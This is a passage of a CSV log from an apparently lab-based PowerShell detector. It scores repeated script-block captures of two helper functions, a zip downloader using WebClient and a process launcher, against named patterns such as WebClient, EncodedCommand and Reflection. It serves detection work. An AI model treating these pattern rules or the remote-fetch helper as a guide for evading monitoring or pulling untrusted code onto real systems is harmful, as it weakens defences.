"timestamp","event_id","risk_score","detected_patterns","pattern_details","command_length","full_command","computer","user_sid","message_number","message_total","matched_patterns"
,,,,,,,,"Unknown",,,
,,,,,,,,"Unknown",,,
,,,,,,,,"Unknown",,,
"12/16/2024 8:34:55 PM","35710695","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:54 PM","35710556","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:56 PM","35710886","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:57 PM","35711074","12",", WebClient, SuspiciousKeyword, Reflection, Compressed","WebClient [Score: 5]; SuspiciousKeyword [Score: 1]; Reflection [Score: 1]; Compressed [Score: 5]","1791","function Invoke-FetchFromZip {
    Param(
        [Parameter(Mandatory = $true, Position = 0)]
        [String]
        $zipUrl,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $targetFilter, # files that match this filter will be copied to the destinationPath, retaining their folder path from the zip
        [Parameter(Mandatory = $true, Position = 2)]
        [String]
        $destinationPath
    )

    # load ZIP methods
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression') | Out-Null

    # read zip archive into memory
    $ms = New-Object IO.MemoryStream
    [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
    (New-Object System.Net.WebClient).OpenRead($zipUrl).copyto($ms)
    $Zip = New-Object System.IO.Compression.ZipArchive($ms)

    # ensure the output folder exists
    $parent = split-path $destinationPath
    $exists = Test-Path -Path $parent
    if ($exists -eq $false) {
        $null = New-Item -Path $destinationPath -ItemType Directory -Force
    }

    # find all files in ZIP that match the filter (i.e. file extension)
    $zip.Entries |
    Where-Object {
            ($_.FullName -like $targetFilter)
    } |
    ForEach-Object {
        # extract the selected items from the ZIP archive
        # and copy them to the out folder
        $dstDir = Join-Path $destinationPath ($_.FullName | split-path | split-path -Leaf)
        New-Item -ItemType Directory -Force -Path $dstDir | Out-Null
        [System.IO.Compression.ZipFileExtensions]::ExtractToFile($_, (Join-Path $dstDir $_.Name), $true)
    }
    $zip.Dispose()
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'SuspiciousKeyword' matched: 'Reflection.Assembly'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'
Pattern 'Compressed' matched: 'IO.Compression'"
"12/16/2024 8:34:54 PM","35710591","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:55 PM","35710730","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:57 PM","35711109","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
                # cache process.Handle, otherwise ExitCode is null from powershell processes
                $handle = $process.Handle

                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                if (-not $process.WaitForExit($Timeout.TotalMilliseconds)) {
                    Invoke-KillProcessTree $process.id

                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                    if ($stdoutFile) {
                        # Add a warning in stdoutFile in case of timeout
                        # problem: $stdoutFile was locked in writing by the process we just killed, sometimes it's too fast and the lock isn't released immediately
                        # solution: retry at most 10 times with 100ms between each attempt
                        For ($i = 0; $i -lt 10; $i++) {
                            try {
                                ""<timeout>"" | Out-File (Join-Path $WorkingDirectory $stdoutFile) -Append -Encoding ASCII
                                break # if we're here it means the file wasn't locked and Out-File worked, so we can leave the retry loop
                            }
                            catch {} # file is locked
                            Start-Sleep -m 100
                        }
                    }
                }

                if ($IsLinux -or $IsMacOS) {
                    Start-Sleep -Seconds 5 # On nix, the last 4 lines of stdout get overwritten upon return so pause for a bit to ensure user can view results
                }

                # Get Process result
                return [PSCustomObject]@{
                    StandardOutput = """"
                    ErrorOutput    = """"
                    ExitCode       = $process.ExitCode
                    ProcessId      = $Process.Id
                    IsTimeOut      = $IsTimeout
                }

            }

        }
        finally {
            if ($null -ne $process) { $process.Dispose() }
            if ($null -ne $stdEvent) { $stdEvent.StopJob(); $stdEvent.Dispose() }
            if ($null -ne $errorEvent) { $errorEvent.StopJob(); $errorEvent.Dispose() }
        }
    }

    begin {
        function NewProcess {
            [OutputType([System.Diagnostics.Process])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [string]$FileName,

                [parameter(Mandatory = $false)]
                [string[]]$Arguments,

                [parameter(Mandatory = $false)]
                [string]$WorkingDirectory
            )

            # ProcessStartInfo
            $psi = New-object System.Diagnostics.ProcessStartInfo
            $psi.CreateNoWindow = $true
            $psi.UseShellExecute = $false
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.FileName = $FileName
            $psi.Arguments += $Arguments
            $psi.WorkingDirectory = $WorkingDirectory

            # Set Process
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.EnableRaisingEvents = $true
            return $process
        }

        function GetCommandResult {
            [OutputType([PSCustomObject])]
            [CmdletBinding()]
            param
            (
                [parameter(Mandatory = $true)]
                [System.Diagnostics.Process]$Process,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$StandardStringBuilder,

                [parameter(Mandatory = $true)]
                [System.Text.StringBuilder]$ErrorStringBuilder,

                [parameter(Mandatory = $true)]
                [Bool]$IsTimeout
            )

            return [PSCustomObject]@{
                StandardOutput = $StandardStringBuilder.ToString().Trim()
                ErrorOutput    = $ErrorStringBuilder.ToString().Trim()
                ExitCode       = $Process.ExitCode
                ProcessId      = $Process.Id
                IsTimeOut      = $IsTimeout
            }
        }
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: 'com/guitarrapc/PowerShellUtil/blob/master/Invoke'
Pattern 'WebClient' matched: 'http'
Pattern 'SuspiciousKeyword' matched: 'Start-Process'"
"12/16/2024 8:34:56 PM","35710921","10",", EncodedCommand, WebClient, SuspiciousKeyword","EncodedCommand [Score: 4]; WebClient [Score: 5]; SuspiciousKeyword [Score: 1]","7821","# The Invoke-Process function is loosely based on code from https://github.com/guitarrapc/PowerShellUtil/blob/master/Invoke-Process/Invoke-Process.ps1
function Invoke-Process {
    [OutputType([PSCustomObject])]
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory = $false, Position = 0)]
        [string]$FileName = ""PowerShell.exe"",

        [Parameter(Mandatory = $false, Position = 1)]
        [string[]]$Arguments = """",

        [Parameter(Mandatory = $false, Position = 3)]
        [Int]$TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, Position = 4)]
        [String]$stdoutFile = $null,

        [Parameter(Mandatory = $false, Position = 5)]
        [String]$stderrFile = $null
    )

    end {
        $WorkingDirectory = if ($IsLinux -or $IsMacOS) { ""/tmp"" } else { $env:TEMP }
        try {
            # new Process
            if ($stdoutFile) {
                # new Process
                $process = NewProcess -FileName $FileName -Arguments $Arguments -WorkingDirectory $WorkingDirectory

                # Event Handler for Output
                $stdSb = New-Object -TypeName System.Text.StringBuilder
                $errorSb = New-Object -TypeName System.Text.StringBuilder
                $scripBlock =
                {
                    $x = $Event.SourceEventArgs.Data
                    if (-not [String]::IsNullOrEmpty($x)) {
                        $Event.MessageData.AppendLine($x)
                    }
                }
                $stdEvent = Register-ObjectEvent -InputObject $process -EventName OutputDataReceived -Action $scripBlock -MessageData $stdSb
                $errorEvent = Register-ObjectEvent -InputObject $process -EventName ErrorDataReceived -Action $scripBlock -MessageData $errorSb

                # execution
                $process.Start() > $null
                $process.BeginOutputReadLine()
                $process.BeginErrorReadLine()
                # wait for complete
                $Timeout = [System.TimeSpan]::FromSeconds(($TimeoutSeconds))
                $isTimeout = $false
                if (-not $Process.WaitForExit($Timeout.TotalMilliseconds)) {
                    $isTimeout = $true
                    Invoke-KillProcessTree $process.id
                    Write-Host -ForegroundColor Red ""Process Timed out after $TimeoutSeconds seconds, use '-TimeoutSeconds' to specify a different timeout""
                }
                $process.CancelOutputRead()
                $process.CancelErrorRead()

                # Unregister Event to recieve Asynchronous Event output (should be called before process.Dispose())
                Unregister-Event -SourceIdentifier $stdEvent.Name
                Unregister-Event -SourceIdentifier $errorEvent.Name

                $stdOutString = $stdSb.ToString().Trim()
                if ($stdOutString.Length -gt 0) {
                    Write-Host $stdOutString
                }

                $stdErrString = $errorSb.ToString().Trim()
                if ($stdErrString.Length -gt 0) {
                    Write-Host $stdErrString
                }

                # Get Process result
                return GetCommandResult -Process $process -StandardStringBuilder $stdSb -ErrorStringBuilder $errorSb -IsTimeOut $isTimeout
            }
            else {
                # This is the enitrety of the ""old style"" code, kept for interactive tests
                $process = Start-Process -FilePath $FileName -ArgumentList $Arguments -WorkingDirectory $WorkingDirectory -NoNewWindow -PassThru
